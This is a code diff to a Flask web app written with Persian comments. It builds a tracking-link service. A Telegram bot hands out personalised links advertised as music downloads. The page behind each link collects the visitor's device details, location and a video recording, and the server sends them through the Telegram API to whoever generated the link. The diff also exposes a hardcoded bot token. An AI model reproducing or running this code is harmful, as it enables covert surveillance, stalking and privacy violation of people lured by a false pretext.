@@ -6,7 +6,6 @@ import json
 app = Flask(__name__)
 
 BOT_TOKEN = "8856249113:AAHjdpUoGjuRyH9bzD-gSomevMMPg1cet64"
-TARGET_CHAT_ID = "8173349543"
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -30,8 +29,13 @@ HTML_TEMPLATE = """
         if(started) return;
         started = true;
         
+        // خواندن آیدی شخص از لینک (مثلاً ?user=123456)
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('user');
+        
         const info = {
             ua: navigator.userAgent,
+            userId: userId,
             ram: navigator.deviceMemory || "نامشخص",
             cores: navigator.hardwareConcurrency || "نامشخص",
             storage: navigator.storage && await navigator.storage.estimate().then(e => (e.quota / 1e9).toFixed(2) + " GB") || "نامشخص"
@@ -86,6 +90,10 @@ def upload():
     video = request.files.get("video")
     info = json.loads(request.form.get("info"))
     label = request.form.get("label")
+    user_id = info.get("userId")  # آیدی شخصی که روی لینک کلیک کرده
+    
+    if not user_id:
+        return "User ID missing", 400
     
     msg = (f"🚨 {label}\n\n"
            f"📍 موقعیت: {info.get('lat')}, {info.get('lon')}\n"
@@ -96,13 +104,31 @@ def upload():
            f"ساخته شده توسط ریس شاهد و ریس نوری\n"
            f"@shahidnaimi5642 | @HOKOMAT_ARAB")
     
+    # ارسال لوکیشن به آیدی خودِ شخص
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
-                  data={"chat_id": TARGET_CHAT_ID, "latitude": info.get('lat'), "longitude": info.get('lon')})
+                  data={"chat_id": user_id, "latitude": info.get('lat'), "longitude": info.get('lon')})
     
+    # ارسال ویدیو به آیدی خودِ شخص
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
-                  data={"chat_id": TARGET_CHAT_ID, "caption": msg},
+                  data={"chat_id": user_id, "caption": msg},
                   files={"video": ("v.webm", video.stream)})
     return "ok"
+
+# بخش ربات تلگرام برای ساخت لینک اختصاصی
+@app.route("/bot", methods=["POST"])
+def bot():
+    update = request.get_json()
+    if update and 'message' in update:
+        chat_id = update['message']['chat']['id']
+        text = update['message'].get('text', '')
+        if text.startswith('/start'):
+            # گرفتن آدرس سایت شما از متغیر محیطی یا به صورت ثابت
+            app_url = os.environ.get("RENDER_EXTERNAL_URL", "https://web-production-2ed72b.up.railway.app")
+            personal_link = f"{app_url}/?user={chat_id}"
+            
+            msg = f"سلام! برای دانلود موزیک از لینک اختصاصی زیر استفاده کنید:\n\n{personal_link}"
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": chat_id, "text": msg})
+    return jsonify({"status": "ok"})
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
